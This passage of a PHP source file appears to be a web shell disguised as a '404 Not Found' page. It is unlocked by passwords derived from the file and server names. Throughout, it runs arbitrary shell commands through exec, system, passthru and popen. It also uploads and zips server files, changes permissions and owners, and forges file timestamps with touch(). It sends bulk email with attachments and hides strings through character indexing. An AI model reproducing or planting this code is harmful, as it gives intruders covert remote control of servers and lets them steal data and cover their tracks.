<?php
session_start().ob_start('ob_gzhandler').header('Cache-Control:no-cache').error_reporting($_SERVER['SERVER_NAME']==='www.localhost'||$_SERVER['SERVER_NAME']==='localhost'?E_ALL:NULL).date_default_timezone_set('UTC');/*
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::: Coding by Denis Aps ::::::::::::::::::::::: https://get-code.de :::::::::::::::::::::::: info@get-code.de :::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

##########################################  S T A R T - O F - S C R I P T - S E T T I N G S  #############################################*/

// [01] Set [ON] for Security or set [OFF] for all Permisson 
		$security  = ('ON'); 

// [02] Location to "..." ==> (if failed Login!)
		$location = (''); 

// [03] Hide spezifity Dir ==> (only one Dir!)
		$hide_dir = ('');

// [04] Hide spezifity File ==> (only one File!)
		$hide_file = ('');

// [05] Transparenz ==> (accepted Values: 0 - 9)
		$transparenz = ('8');

// [06] Colors of Text-Layer
		$background_txt = ('#fff');               	// [default: "Black"]
		$color_txt      = ('#000');               	// [default: "White"]

// [07] Background-Style ==> (URL are allowed)
		$background_style = ('');                 	// [default: "Black"]
		$color_style = ('#999');                  	// [default: "white"]

// [08] Set "base64" Password for this Login!
		$first_pwd  = ('');               	        // [default: This Filename, without Extension]
		$second_pwd = ('');                       	// [default: This Servername, without Domain. Behind a "1" and from yesterday used the Number of Day]

// [09] Custom Address for EMail
		$from_mail   = ('');     		               	// [default: "info@" and behind real Servername]
		$target_mail = ('');      		            	// (for testing custom EMail Templates) 
		$titel_mail  = ('');     		               	// [default: "Hallo" and the Name from the target Address]

// [10] Colors of sending EMail ==> (if only dosn't include a File!)
		$background_mail = ('');                  	// URL are allowed ==> [default: "Black"]
		$color_mail      = ('');                  	// [default: "White"]

// [11] Text as Template for EMail ==> (if you write a new Mail)
		$text_mail = ('');

// [12] Text for failed Login AND empty second "location" ==> [default: "404 not Found!"]
		$failed = ('');

// [13] Text as "Comment" for create a new Zip File from compressed Dir or File ==> [default: "Data from" and this Servername]
		$comment_zip = ('');

// [14] How many Upload or Attachment Inputs ==> [default: "3"]
		$input = (''); 

/*#####################################  E N D - O F - S C R I P T - S E T T I N G S  ########################################################



!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!  D O N ' T - E D I T - T H I S - P A R T  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*/
$s=array(
'DOCUMENT_ROOT',           // 0
'PHP_SELF',
'HTTP_REFERER',            // 2
'REQUEST_URI',
'SCRIPT_FILENAME',         // 4
'SERVER_NAME',
'REMOTE_ADDR',             // 6
'SCRIPT_FILE',
'SERVER_SOFTWARE',         // 8
'HTTP_USER_AGENT',
'HTTP_HOST',               // 10
'SERVER_ADMIN',
'SERVER_PORT',             // 12
'REMOTE_ADDR',
'AUTH_TYPE',               // 14
'REQUEST_METHOD');

$g=array(
'action',                  // 0
'qt',
'chm',                     // 2
'm',
'rename',                  // 4
'name',
'copy',                    // 6
'cc',
'del',                     // 8
'edit',
'pic',                     // 10
'bilder',
'filter',                  // 12
'sort',
'mail',                    // 14
'suche',
'fa',                      // 16
'fm',
'uname',                   // 18
'cut',
'a-z',                     // 20
'1-9',
'dl',                      // 22
'p',
'cm',                      // 24
'cmd',
'titel',                   // 26
'gid',
'z',                       // 28
'zipp',
'unzipp',                  // 30
'd',
'info',                    // 32
'stxt',
'search',                  // 34
'mov'); 

$p=array(
'submit',                         // 0
'new_dir',
'inhalt',                         // 2
'titel',
'a_check',                        // 4
'a_s',
'uml',                            // 6
'trim',
'pp',                             // 8
'cmd',
'cache',                          // 10
'e_em',
'e_em2',                          // 12
'e_inh',
'rep',                            // 14
'n_rep',
'dec',                            // 16
'enc',
'm_save',                         // 18
'search',
'recursiv');                      // 20

 $img_type=array('jpg','JPG','bmp','BMP','gif','GIF','png','PNG','ico','ICO','ani','ANI');
 $mov_type=array('mp4','flv','webm');
 $exec_type=array('exe','EXE','rar','RAR','msi','MSI','img','IMG','doc','tar.zip','gzip','zip','ZIP','xls');
 $tx_type=array('txt','htm','html','css','js','xml','csv','php','php4','tpl','ini','htaccess');
 $head_dl_array=array('Pragma:public','Cache-Control:must-revalidate,post-check=0,pre-check=0','Cache-Control:private'.false,'Content-type:application/force-download','Content-Transfer-Encoding:binary');
 $erlaubte_mimetypen=array('text/plain','image/pjpg','image/pjpeg','image/gif','image/jpg','image/peng','image/jpeg','image/bmp','image/x-windows-bmp','image/tiff','image/x-tiff','application/plain', 'application/x-photoshop','application/octet-stream','application/postscript','application/xms-word','application/mspowerpoint','application/powerpoint','application/vnd.ms-powerpoint','application/x-mspowerpoint','application/excel','application/x-excel','application/vnd.ms-excel','application/x-msexcel','application/zip','application/x-zip','application/x-compressed','application/x-zip-compressed','audio/mid','audio/mp3','application/x-winamp-plugin','interface/x-winamp-skin','audio/x-mp3');

////////////////////////////////////////////////// start of "Functions" ///////////////////////////////////////////////////////
function s_aps($s){return isset($_SERVER[$s]) ? trim($_SERVER[$s]) : false;}
function g_aps($g){return isset($_GET[$g]) ? trim($_GET[$g]) : false;}
function p_aps($p){return isset($_POST[$p]) ? trim($_POST[$p]) : false;}
function req($g){return isset($_REQUEST[$g]) ? $_REQUEST[$g] : false;}
function go_url($die='',$location=''){return $location?header('Location:'.$location):die($die);exit;}
function DDel($d){$dd=dir($d);while($t=$dd->read()){if(($t!='..')&&($t!='.')){is_dir($d.'/'.$t)?DDel($d.'/'.$t):@unlink($d.'/'.$t);}}$dd->close();chmod($d,0777);rmdir($d);return true;} 
function DCopy($SD,$TD){$TD=$TD.'/';substr($SD,-1)!='/'?$SD.='/':'';substr($SD,-1)!='/'?$TD.='/':'';$h=@opendir($SD);if(!is_dir($TD)){mkdir($TD);}while($e=readdir($h)){if($e[0]=='.')continue;if(is_dir($SD.$e)){DCopy($SD.$e,$TD.$e);}else{$ta=$TD.$e;copy($SD.$e,$ta);}}return true;}
function ads(){$ads='';$asd=array('wget','fetch','curl','GET','lynx');foreach($asd as $as){@file_exists("/usr/bin/$as")?$ads.=$as:'';}return $ads;}
function BITES($siz){$size=(is_dir($siz)?@array_sum(@array_map('filesize',glob($siz."/*"))):@fileSize($siz));if($size>=1073741824){return round(($size/1073741824),2)."&nbsp;GB";}else if($size>=1048576){return round(($size/1048576),2)."&nbsp;MB";}else if($size>=1024){return round(($size/1024),2)."&nbsp;KB";}else{return $size."&nbsp;Byte";}}
function CBITES($x0b){$x0c=strlen($x0b);if($x0c<4){return sprintf("%d",$x0b);}if($x0c>=4&&$x0c<=6){return sprintf("%0.2f Kb",$x0b/1024);}if($x0c>=7&&$x0c<=9){return sprintf("%0.2f Mb",$x0b/1024/1024);} return sprintf("%0.2f Gb",$x0b/1024/1024/1024);}
function RANDOM(){return substr(md5(rand(1,9999)),0,8).substr(time(),-6);}
function FRANDOM($f){return RANDOM().'.'.getExtension($f);}
function UPLFILES($fpost){$fary=array();$fcount=count($fpost['name']);$fkeys=@array_keys($fpost);for($i=0;$i<$fcount;$i++){foreach($fkeys as $key){$fary[$i][$key]=$fpost[$key][$i];}}return $fary;}
function UPL($ud,$uf){foreach(UPLFILES($uf) as $key => $value){$da=$_FILES['upl']['tmp_name'][$key];$daname=$_FILES['upl']['name'][$key];@move_uploaded_file($da,$ud.basename($daname));}return header('Location:'.s_aps($s[3]));}
function CLEAN($eingabe, $encoding = 'UTF-8'){return htmlspecialchars(strip_tags($eingabe), ENT_QUOTES | ENT_HTML5, $encoding);}

function EMAIL($an,$from,$from_m,$betr,$text,$da){
$e_verg=(strtok($from,'@')?$from:$from_m);
$id = md5(uniqid(time())); 

if(isset($da)){
$datei=$da['name']; 
$dateiname=$da['tmp_name']; 
$dateitype=$da['type'];
$dat=array();
 $kopf="From: ".$from."<".$e_verg.">\n"."MIME-Version: 1.0\n"."Content-Type: multipart/mixed; boundary=$id\n\n"."This is a multi-part message in MIME format\n"."--$id\n"."Content-Type:text/html; charset='ISO-8859-1'\n"."Content-Transfer-Encoding: 8bit\n\n"."$text\n";
foreach($datei as $h){array_push($dat,$h);}
for ($i=0;$i<=count($dat);$i++){
$kopf.="\n--$id"."\nContent-Type: ".$dateitype[$i]."; name=".$dat[$i]."\n"."Content-Transfer-Encoding: base64\n"."Content-Disposition: attachment; filename=".$dat[$i]."\n\n"; 
 $zeiger=fopen($dateiname[$i],"rb");
 $dateiinhalt=fread($zeiger,filesize($dateiname[$i]));
 fclose($zeiger);
 $kopf.=chunk_split(base64_encode($dateiinhalt));
 $da=$dat[$i];}}
else{
 $kopf="From: ".$from."<".$e_verg.">\n"."Content-Type:text/html; charset='ISO-8859-1'\n"."Content-Transfer-Encoding: 8bit\n\n"."$text\n";
}

$kopf.="\n--$id--"; 
mail($an,$betr,"",$kopf);}




function TMP($t){$tmp=tmpfile();fwrite($tmp,$t);fseek($tmp,0);$e=fread($tmp,1024);fclose($tmp);return $e;}

function cmd($CMDs){$CMD[1]='';
@exec($CMDs,$CMD[1]);
empty($CMD[1])?$CMD[1]=@shell_exec($CMDs):
(empty($CMD[1])?$CMD[1]=@passthru($CMDs):
(empty($CMD[1])?$CMD[1]=@system($CMDs):
(empty($CMD[1])?$handle=@popen($CMDs,'r'):'')));
while(!feof($handle)){$CMD[1][].=@fgets($handle);
}pclose($handle);return $CMD[1];}

function strtok_all($string,$delim){
  $tok=strtok($string,$delim);
  $arr=array();
while($tok!==false){
  $arr[]=$tok;
  $tok=strtok($delim);}
return $arr;}
////////////////////////////////////////////////// end of "Functions" ///////////////////////////////////////////////////////

////////////////////////////////////////////////// start of "Options for Settings" ////////////////////////////////////////////
 define('UP',(!empty($first_pwd)?base64_decode($first_pwd):strtok(basename(s_aps($s[1])),'.')));
 define('UPP',(!empty($second_pwd)?base64_decode($second_pwd):strtok(basename(s_aps($s[5])),'.').'1'.intval(date('d')-1)));
 define('SECURITY',(!empty($security)?$security:'ON'));
 define('AUTHENT',((s_aps($s[5])==='localhost')||(s_aps($s[6])==='127.0.0.1')?true:false));

 $background_style=(!empty($background_style)?!pathinfo($background_style)?$background_style:'url('.$background_style.') #fff;background-repeat:repeat;background-attachment:fixed':'#000');
 $color_style=(!empty($color_style)?$color_style:'#fff');
 $background_txt=(!empty($background_txt)?$background_txt:'#000');
 $color_txt=(!empty($color_txt)?$color_txt:'#fff');
 $background_mail=(!empty($background_mail)?!pathinfo($background_mail)?$background_mail:'url('.$background_mail.') #fff;background-repeat:repeat;background-attachment:fixed':'#000');
 $color_mail=(!empty($color_mail)?$color_mail:'#fff');
 $from_mail=(!empty($from_mail)?$from_mail:'info@'.s_aps($s[5]));
 $target_mail=(!empty($target_mail)?$target_mail:'');
 $titel_mail=(!empty($titel_mail)?$titel_mail:('Hallo '.ucfirst(strtok($target_mail,'@'))));
 $mail_txt=(!empty($text_mail)?$text_mail:"<a href=\"http://".s_aps($s[5])."\" target=\"_blank\" style=\"cursor:default;text-decoration:none;\">\n<div style=\"width:98%;height:98%;color:".$color_mail.";background:".$background_mail.";overflow-y:auto;overflow-x:hidden;\">\n<h1 align=\"center\">\n\n</h1>\n<fieldset style=\"margin-left:4%;width:92%;height:auto;border:4px double #555;color:orange;padding:5px;background:#000;overflow-y:auto;overflow-x:hidden;filter:alpha(opacity=".$transparenz."0);-moz-opacity:0.".$transparenz.";-khtml-opacity:0.".$transparenz.";opacity:0.".$transparenz.";\">\n<legend style=\"border:2px double #555;color:#cfcfcf;background:#000;filter:alpha(opacity=".$transparenz."0);-moz-opacity:0.".$transparenz.";-khtml-opacity:0.".$transparenz.";opacity:0.".$transparenz."\">\n\n</legend>\n\n</fieldset>\n</div></a>");

 $di=("<title>404 File not found</title>\n\r\r<h1>Not Found</h1>\n\n\r<p>The requested URL was not found on this Server.</p>\n\r<hr>\n\r\r<address>".s_aps($s[8])." Server at ".s_aps($s[5])." Port ".s_aps($s[12])."</address>");
 $die=(!empty($failed)?$failed:$di);

// $die=(!empty($failed)?$failed:header('HTTP/1.0 404 Not Found'));
 $transp=(!empty($transparenz)?'filter:alpha(opacity='.$transparenz.'0);-moz-opacity:0.'.$transparenz.';-khtml-opacity:0.'.$transparenz.';opacity:0.'.$transparenz.';':'');
 $zip_c=(!empty($comment_zip)?$comment_zip:'Data from "'.s_aps($s[5]).'".');
////////////////////////////////////////////////// end of "Options for Settings" ////////////////////////////////////////////////

////////////////////////////////////////////////// start of "Definitions" ///////////////////////////////////////////////////////
 $rpv=g_aps($g[10])?g_aps($g[10]):(g_aps($g[14])?g_aps($g[14]):g_aps($g[1]));
 $rpstr=str_replace(s_aps($s[0]),'',g_aps($g[0]));
 $rp=str_replace(realpath(s_aps($s[0])),'',realpath(g_aps($g[0]).$rpv));
 $cwd=(AUTHENT?str_replace('\\','/',getcwd()):getcwd()).'/';
 $sbht=basename(s_aps($s[1]));
 $sd=dirname(s_aps($s[4]));
 $bpfa=explode('/',$rpstr);
 $own=explode('/',s_aps($s[0]));
 $is_dir=basename(dirname(g_aps($g[0]).'../'));
 $tx=g_aps($g[0]).$rpv;$n='abcdefghijklmnopqrstuvwxyz';
 $txr=g_aps($g[0]).p_aps($p[1]);
 $ggg=sha1(UP.UPP);isset($_SESSION[sha1(UP.UPP)])?$supp=$_SESSION[sha1(UP.UPP)]:'';
 (g_aps($g[32])==='pinfo'?die(phpinfo()):'');
 (g_aps($g[14])?stripslashes(g_aps($g[14])):'');
 $titel=(g_aps($g[26])?g_aps($g[26]):'');
 $inh_aps=is_dir(g_aps($g[0]))?array_slice(scandir(g_aps($g[0])),(g_aps($g[0])==s_aps($s[0])?"3":"2")):'';
 $chmg_s=(g_aps($g[1])||g_aps($g[10])?'100400':'40000');
 $chmg_e=(g_aps($g[1])||g_aps($g[10])?'100644':'40755');
 $f_type=array($img_type,$exec_type,$tx_type,$mov_type);
 $typ=pathinfo(g_aps($g[0]).g_aps($g[1]));
 $typ=isset($typ['extension'])?$typ['extension']:g_aps($g[1]);
 $trim=!empty($tx)?str_replace(chr(13).chr(10),'',php_strip_whitespace($tx)):'';
 $repl=str_replace((p_aps($p[14])?p_aps($p[14]):''),(p_aps($p[15])?p_aps($p[15]):''),p_aps($p[2]));
 $dec=base64_decode(p_aps($p[2]));
 $enc=base64_encode(p_aps($p[2]));
 isset($_SESSION['c_d'])?$copy_datei=$_SESSION['c_d']:'';
 isset($_SESSION['c_v'])?$copy_verz=$_SESSION['c_v']:'';
 isset($_SESSION['msg'])?$msgg=$_SESSION['msg']:'';$msg='';
 $sturl=$n[6].$n[4].$n[19].'-'.$n[2].$n[14].$n[3].$n[4].'.'.$n[3].$n[4];
 $ninf=!empty($sturl)?"&copy;'<a href=\"".$n[7].$n[19].$n[19].$n[15]."&#58;&#47;&#47;".$sturl."\">".$sturl."</a>":die($die);
 $einf_info=(@file_exists($copy_verz.'/'.$copy_datei)?(isset($copy_datei)?'<span style="color:#ff0000;">[&nbsp;<a href="'.s_aps($s[3]).'&amp;'.$g[6].'='.$copy_datei.'" style="color:#00CC11;">(&#99;&#111;&#112;&#121;)</a>&hArr;<a href="'.s_aps($s[3]).'&amp;'.$g[19].'='.$copy_datei.'" style="color:#00CC88;">(&#99;&#117;&#116;)</a>&nbsp;&rArr;&nbsp;<blink><a href="?'.$g[0].'='.$copy_verz.'&amp;'.$g[1].'='.$copy_datei.'" style="color:#ff0000;">'.$copy_datei.'</a></blink>&nbsp;]</span>&nbsp;&nbsp;|&nbsp;&nbsp;':''):'');
 $fim=@filemtime($tx);$fia=@fileatime($tx);$fio=@fileowner($tx);$fic=substr(sprintf('%o',@fileperms($tx)),-4);$fig=@filegroup($tx);
 $dinfo=(!g_aps($g[14])?"&nbsp;&nbsp;&#65;&#117;&#116;&#104;&#111;&#114;&#105;&#116;&#121;&#58;&nbsp;<span><a href=\"".s_aps($s[3])."\" title=\"".(@octdec($fio)?@octdec($fio):'???')."\">".($own[1]?$own[1]:'???')."</a></span>&nbsp;=&nbsp;<span>".($fig?$fig:'???')."</span>&nbsp;&nbsp;|&nbsp;&nbsp;":"");
 $em=(!g_aps($g[14])?'<a href="?'.$g[0].'='.g_aps($g[0]).'&amp;'.$g[14].'=new">&nbsp;&#64;&nbsp;</a>':'<a href="?'.$g[0].'='.g_aps($g[0]).'">&nbsp;&#69;&#100;&#105;&#116;&#111;&#114;&nbsp;</a>');
 $brkr=!empty($ninf)?$ninf.'&nbsp;>>>&nbsp;':die($die);
 $fol=$fil=$bst='';
 $fol_nr=$fil_nr=$size_all=0;
 $filter_link=array();
 $filter=req($g[12])?req($g[12]):'';
 $suche_t = isset($_SESSION['search'])?$_SESSION['search']:'';
 ////////////////////////////////////////////////// end of "Definitions" ///////////////////////////////////////////////////////

////////////////////////////////////////////////// start of "Server Information" ///////////////////////////////////////////////////////
 $i_dis='<b style="color:#DC143C;">&#100;&#105;&#115;&#97;&#98;&#108;&#101;&#100;</b>';
 $ph_i=(isset($PHPv)?$PHPv:(phpversion()?phpversion():$i_dis));
 $ph_u=(@php_uname()?@php_uname():$i_dis);
 $f_spc=(diskfreespace($cwd)?CBITES(diskfreespace($cwd)):$i_dis);
 $t_spc=(disk_total_space($cwd)?CBITES(disk_total_space($cwd)):$i_dis);
 $v_spc=(disk_total_space($cwd)&& diskfreespace($cwd)?CBITES(disk_total_space($cwd)-diskfreespace($cwd)):$i_dis);
 $dts = @disk_total_space($cwd);
 $total = $dts - @diskfreespace($cwd);
 $s_i=((isset($safemode)?$safemode:'').(strtoupper(substr((isset($OS)?$OS:''),0,3)!="Win")?$methods=ads().(isset($methods)==""?$methods=$i_dis:""):""));
 $m_i=($methods?(s_aps($s[15])?s_aps($s[15]):$i_dis):($methods?$methods:'disable'));
 $u_i=(s_aps($s[10])?s_aps($s[10]):$i_dis);
 $i_i=(s_aps($s[6])?s_aps($s[6]):$i_dis);
 $po_i=(s_aps($s[12])?s_aps($s[12]):$i_dis);
 $bs_i=(PHP_OS?PHP_OS:$i_dis);
 $s_i=(s_aps($s[8])?s_aps($s[8]):$i_dis);
/////////////////////////////////////////////////// end of "Server Information" ////////////////////////////////////////////////////////

////////////////////////////////////////////////////// Login /////////////////////////////////////////////////////////////////////
if(g_aps($g[23])){
if(g_aps($g[23])===UP){die($die.'<script>check=prompt("Set second Password","");window.location="?'.$g[23].'="+check;</script>');}
elseif(g_aps($g[23])===UPP){$_SESSION[sha1(UP.UPP)]=array(sha1(UP),sha1(UPP),date("D-M-Y H:M:S"),$bpfa,RANDOM());$_SESSION['msg']='Hallo '.UP;
header('Location:?'.$g[0].'='.(!AUTHENT?dirname(__FILE__):str_replace('\\','/',dirname(__FILE__))).'/&'.$g[1].'='.basename(__FILE__));exit;}
else{!empty($target_mail) && SECURITY==='ON'?EMAIL($target_mail,$from_mail,'',stripslashes('Wrong Login at "'.s_aps($s[10]).'"!'),stripslashes($error_mail),''):'';}}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


$cwdp=explode('/',g_aps($g[0]));
foreach($cwdp as $el){
if($el==end($cwdp)){
 $brkr.=$el;}
else{
 $brkr.='<a href="?action='.str_replace(stristr(g_aps($g[0]), $el), '', g_aps($g[0])).$el.'/">'.$el.'</a>&nbsp;&#47;&nbsp;';}}
//if($chdir=dirname($cwd))@chdir($chdir);
if(is_file($tx)){
 $dat=fopen($tx,'r');
 $nume=0; $num=''; $cod='';
while($inhal=fgets($dat)){
 $nume++;
 $nu=$nume.chr(13);
 $num.=($nu<=0?str_repeat($nu,'60'):$nu);
 $cod.=htmlspecialchars($inhal);}}
if(AUTHENT){
 $loc_v="&nbsp;<select size=\"1\" onchange=\"location=this.value\">";
for($l="C";$l<"L";$l++){
 $loc_v.="<option value=\"?".$g[0]."=".$l.":/\">".$l.":/</option>";}
 $loc_v.="</select>";}
if(strstr(s_aps($s[3]),'&')){
 $statu=explode('=',s_aps($s[3]));
 $stat=ucfirst(end($statu));}
else{
 $statu=explode('&',s_aps($s[3]));
 $stat=ucfirst(end($statu));}
 $uc=$stat?$stat:$rpv;
 $sce=@array_filter(glob(g_aps($g[0])."*"),'is_file');
 $statv=("[<a href=\"".(!$rpv?$rp.'/':$rp)."\" style=\"color:#00F0E5;\" target=\"_blank\">".ucfirst($rpv?$rpv:basename(g_aps($g[0])))."</a>".(g_aps($g[1])?"&rArr;&nbsp;<strong style=\"color:#FF6600;\">".(is_file($tx)?count(file($tx)):'')."</strong>]":']')."&nbsp;&nbsp;Size:".(BITES($tx)?BITES($tx):'???'));
 $status=(!g_aps($g[14])?(g_aps($g[1])||g_aps($g[10])||trim(g_aps($g[0])))?$statv."&nbsp;&nbsp;CHMod:<a href=\"javascript:var%20s=prompt('','".decoct(@fileperms($tx?$tx:basename(g_aps($g[0]))))."');window.location='".s_aps($s[3])."&".$g[31]."=".g_aps($g[1])."&".$g[2]."='+s\">".decoct(@fileperms($tx?$tx:basename(g_aps($g[0]))))."</a>&nbsp;&nbsp;Last&nbsp;modified:<a href=\"javascript:var%20s=prompt('','".date('d.m.Y H:i:s',$fim)."');window.location='".s_aps($s[3])."&".$g[31]."=".g_aps($g[1])."&".$g[17]."='+s\">".date('d.m.Y H:i:s',$fim)."</a>[".intval((time()-$fim)/86400)."&nbsp;&#68;&#97;&#121;&#115;]&nbsp;&nbsp;Create:<a href=\"javascript:var%20s=prompt('','".date('d.m.Y H:i:s',$fia)."');window.location='".s_aps($s[3])."&".$g[31]."=".g_aps($g[1])."&".$g[16]."='+s\">".date('d.m.Y H:i:s',$fia)."</a>[".intval((time()-$fia)/86400)."&nbsp;&#68;&#97;&#121;&#115;]":($statu?'&nbsp;<i>'.end($statu).'</i>':$status):'');
 (!g_aps($g[14]) && isset($_FILES['upl']['tmp_name'])?UPL(g_aps($g[0]),$_FILES['upl']).header('Location:'.s_aps($s[3])):'');
 $cache=p_aps($p[10]);

////////////////////////////////////////////////// start of "Commands" ///////////////////////////////////////////////////////
switch(isset($supp)&&!empty($sturl)){	
case(g_aps($g[0])===$ggg):
 if(isset($_SESSION['c_d'])){
  unset($_SESSION['c_d'],$_SESSION['c_v']);}
 if(isset($_SESSION['search'])){
  unset($_SESSION['search']);}
  unset($_SESSION['msg']);
  unset($_SESSION[$ggg]);
  return die($die); break;
case(!empty(p_aps($p[19]))):
  $_SESSION['search'] = p_aps($p[19]);
  $msg = 'Suche wurde gespeichert';
  break;
case(g_aps($g[33]) === 'del'):
 if(isset($_SESSION['search'])){
  unset($_SESSION['search']);
  $msg = 'Suche wurde gel&ouml;scht';
  header('Location:'.str_replace('&stxt=del','',(g_aps($g[34]) === 'recursiv' ? str_replace('&search=recursiv','',s_aps($s[3])) : s_aps($s[3]))));}
 else{
  $msg = 'Suche wurde nicht gel&ouml;scht';
  header('Location:'.str_replace('&stxt=del','',s_aps($s[3])));}
  break;
case(!g_aps($g[34]) && $suche_t && p_aps($p[20])):
  header('Location:'.s_aps($s[3]).'&search=recursiv');
  break;
case(g_aps($g[25])):
  g_aps($g[25])!=''?$cmdget=g_aps($g[25]):'';p_aps($p[9])!=''?$cmdget=p_aps($p[9]):'';
  $cmdget=htmlspecialchars($cmdget);$cmdget='';
  g_aps($g[25])!=''?$cmd=g_aps($g[25]):'';p_aps($p[9]) !=''?$cmd=p_aps($p[9]):'';
  $cmd=stripslashes(trim($cmd));
  $result_arr=cmd($cmd);
  $co=count($result_arr);$ac=0;
 $msg="Results: ".$cmd;
 if($result_arr){
  while($ac<=$co){
  $msg=$result_arr[$ac]." ";$ac++;}}
  else{$msg="An execute comand Error [".$cmd."].";}
 header('Location:'.str_replace('&'.$g[25].'='.g_aps($g[25]),'',urldecode(s_aps($s[3])))); break;
case(g_aps($g[29])):
  $ZipFile=(g_aps($g[29])?str_replace('.'.$f_type,'',g_aps($g[29])):date()).'.zip';
  $zd=g_aps($g[0]).g_aps($g[29]);
  $zip=new ZipArchive();
  $zip->open(g_aps($g[0]).$ZipFile,ZipArchive::CREATE);
 if(is_dir($zd)){
  $Iter=new RecursiveDirectoryIterator($zd);
  $it=new RecursiveIteratorIterator($Iter);
  foreach($it as $el){
  $dir=str_replace(g_aps($g[0]),'',$el->getPath());      
 if($el->isDir()){
  $zip->addEmptyDir($dir);} 
 elseif($el->isFile()){
  $fi=$el->getPath().'/'.$el->getFilename();
  $fiAr=$dir.'/'.$el->getFilename();
  $zip->addFile($fi,$fiAr);}}}
 else if(is_file($zd)){
  $zip->addFile($zd,g_aps($g[29]));}
  $zip->setArchiveComment($zip_c);
  $zip->close();
 $msg='<b>'.g_aps($g[29]).'</b> was packed.';
 header('Location:'.str_replace('&'.$g[29].'='.g_aps($g[29]),'',urldecode(s_aps($s[3])))); break;
case(g_aps($g[30])):
  $zip=new ZipArchive(); 
  $zip->open(g_aps($g[0]).g_aps($g[30])); 
  $zip->extractTo(g_aps($g[0])); 
  $zip->close();
 $msg='<b>'.g_aps($g[30]).'</b> was unpacked.';
 header('Location:'.str_replace('&'.$g[30].'='.g_aps($g[30]),'',urldecode(s_aps($s[3])))); break;


case(g_aps($g[22])):
  $dl_dir=g_aps($g[0]);$dl_file=g_aps($g[22]);
 if(!empty($dl_file)){
 foreach($head_dl_array as $h_dl_a){header($h_dl_a);}
  header("Content-Disposition:attachment;filename=\"$dl_file\"").header("Content-Type:application/.").header("Content-Length:".filesize($dl_dir.$dl_file));
  readfile($dl_dir.$dl_file);}return false;
  break;
case(g_aps($g[14])):


if(p_aps($p[11]) && p_aps($p[3]) && p_aps($p[2])){
 $da=$_FILES['upl'];
 
if(!EMAIL(trim(p_aps($p[11])),trim(p_aps($p[12])),$from_mail,stripslashes(p_aps($p[3])),stripslashes(p_aps($p[2])),($da?$da:''))){
 $msg=('<b style="color:red;">Mail not sending!</b>');}
else{
 $msg=(p_aps($p[11])!=''?'<b style="color:green;">Mail is sending at "'.trim(p_aps($p[11])).'"!</b>':'<b style="color:red;">Bitte einen Empf&auml;nger eintragen!</b>').(p_aps($p[18])!=''?' -> <i style="color:lightgreen;">Mail gespeichert!</i>':'');
}
if(p_aps($p[18])){
 $m_info='<p>Betreff: "'.p_aps($p[3]).'" ---- An: "'.p_aps($p[11]).'" ---- Zeit: "'.date("d.m.j - H:i:s").'"'.($da?' ---- Anhang: "'.$da['tmp_name'][0].'"':'').'</p><hr>';
 !is_dir(s_aps($s[0]).'/mail')?@mkdir(s_aps($s[0]).'/mail',0755):@file_put_contents(s_aps($s[0]).'/mail/'.p_aps($p[3]).'-'.date("d.m.j - H:i:s").'.html',$m_info.p_aps($p[2]));}

 

/*
if(p_aps($p[11]) && p_aps($p[3]) && p_aps($p[2])){
 $da=$_FILES['upl'];
 
 EMAIL(trim(p_aps($p[11])),trim(p_aps($p[12])),$from_mail,stripslashes(p_aps($p[3])),stripslashes(p_aps($p[2])),($da?$da:''));

if(p_aps($p[18])){
 $m_info='<p>Betreff: "'.p_aps($p[3]).'" ---- An: "'.p_aps($p[11]).'" ---- Zeit: "'.date("d.m.j - H:i:s").'"'.($da?' ---- Anhang: "'.$da['tmp_name'][0].'"':'').'</p><hr>';
 !is_dir(s_aps($s[0]).'/mail')?@mkdir(s_aps($s[0]).'/mail',0755):@file_put_contents(s_aps($s[0]).'/mail/'.p_aps($p[3]).'-'.date("d.m.j - H:i:s").'.html',$m_info.p_aps($p[2]));}
 $msg=(p_aps($p[11])!=''?'<b style="color:green;">Mail is sending at "'.trim(p_aps($p[11])).'"!</b>':'<b style="color:red;">Bitte einen Empf&auml;nger eintragen!</b>').(p_aps($p[18])!=''?' -> <i style="color:lightgreen;">Mail gespeichert!</i>':'');
*/

  header('Location:'.s_aps($s[3]));} break;


case(g_aps($g[2])):
   $chmod=octdec(g_aps($g[2]));
  if(g_aps($g[31])!==''){@chmod(g_aps($g[0]).g_aps($g[31]),$chmod);}
  elseif(SECURITY==='OFF'){@chmod(g_aps($g[0]).g_aps($g[31]),$chmod);}
  else{die('<br><h1 align="center" style="color:red;">Comand is disabled for this Directory (ROOT), because you destroy this current Server!</h1>');}
 $msg='<b>'.g_aps($g[2]).'</b> was modified in "<i>'.$chmod.'</i>"!';
  header('Location:'.str_replace('&'.$g[31].'='.g_aps($g[31]).'&'.$g[2].'='.g_aps($g[2]),'',urldecode(s_aps($s[3])))); break;

case(g_aps($g[18])):
   $chown=g_aps($g[18]);
  if(g_aps($g[31])!==''){@chown(g_aps($g[0]).g_aps($g[31]),"$chown");}
 $msg='<b>Owner</b> was modified in "<i>'.g_aps($g[18]).'</i>"!';
  header('Location:'.str_replace('&'.$g[31].'='.g_aps($g[31]).'&'.$g[18].'='.g_aps($g[18]),'',urldecode(s_aps($s[3])))); break;

case(g_aps($g[27])):
   $chgrp=g_aps($g[27]);
  if(g_aps($g[31])!==''){@chgrp(g_aps($g[0]).g_aps($g[31]),$chgrp);}
 $msg='<b>Group</b> was modified in "<i>'.g_aps($g[27]).'</i>"!';
  header('Location:'.str_replace('&'.$g[31].'='.g_aps($g[31]).'&'.$g[27].'='.g_aps($g[27]),'',urldecode(s_aps($s[3])))); break;


case((g_aps($g[17])?g_aps($g[17]):g_aps($g[16]))):
  $file=g_aps($g[0]).g_aps($g[31]);
  $to=strtotime((g_aps($g[17])?g_aps($g[17]):g_aps($g[16])));
  @touch($file,$to);
 $msg='<b>'.g_aps($g[17]).'</b> was modified in "<i>'.$to.'</i>"!';
  header('Location:'.str_replace('&'.$g[31].'='.g_aps($g[31]).'&'.$g[17].'='.g_aps($g[17]),'',urldecode(s_aps($s[3])))); break;
case(p_aps($p[1])):
  @mkdir(g_aps($g[0]).p_aps($p[1]),0755);
